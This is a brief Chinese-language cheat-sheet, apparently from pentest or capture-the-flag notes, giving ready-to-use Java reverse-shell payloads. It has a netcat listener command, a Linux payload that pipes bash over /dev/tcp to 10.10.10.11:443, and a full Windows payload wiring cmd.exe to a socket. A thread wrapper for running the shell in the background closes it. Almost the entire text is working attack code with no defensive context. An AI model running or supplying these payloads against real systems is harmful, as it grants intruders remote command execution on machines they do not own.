# Java版本反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：

linux平台：

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

windows平台：

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

创建线程：

```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();

```

